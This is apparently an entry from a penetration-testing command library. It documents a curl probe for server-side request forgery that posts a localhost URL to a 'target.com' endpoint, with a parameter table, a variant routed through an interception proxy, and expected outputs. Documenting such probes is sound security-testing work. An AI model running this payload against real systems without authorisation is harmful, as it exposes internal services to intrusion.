---
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
name: curl-basic-ssrf-test
type: command
executor: bash
data: 'curl -X POST http://target.com/ssrf-endpoint -d ''url=http://127.0.0.1:80/'''
output: null
created_at: '2023-04-06T03:56:37.743931+00:00'
updated_at: '2023-04-10T20:23:55.837756+00:00'
platforms:
  - Web
tags:
  - ssrf
  - test
verified: true
validated: true
---

# curl-basic-ssrf-test

## Command

```bash
curl -X POST http://target.com/ssrf-endpoint -d 'url=http://127.0.0.1:80/'
```

## Description

This command tests for basic SSRF by submitting a localhost URL to a vulnerable endpoint, checking if the application makes the internal request.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `http://target.com/ssrf-endpoint` | Vulnerable application URL | Yes |
| `-d 'url=http://127.0.0.1:80/'` | Payload with internal URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST http://target.com/ssrf-endpoint -d 'url=http://127.0.0.1:80/'
```

### With Proxy for Interception

```bash
curl -X POST http://target.com/ssrf-endpoint -d 'url=http://127.0.0.1:80/' --proxy http://127.0.0.1:8080
```

## Expected Output

Successful SSRF: HTTP response with internal content, e.g., "<html>Internal Server</html>" or connection timeout. Blocked: Error like "Invalid URL" or no internal indicators.

## Related

- [[procedures/Java-Jar-Protocol-SSRF-Bypass]]
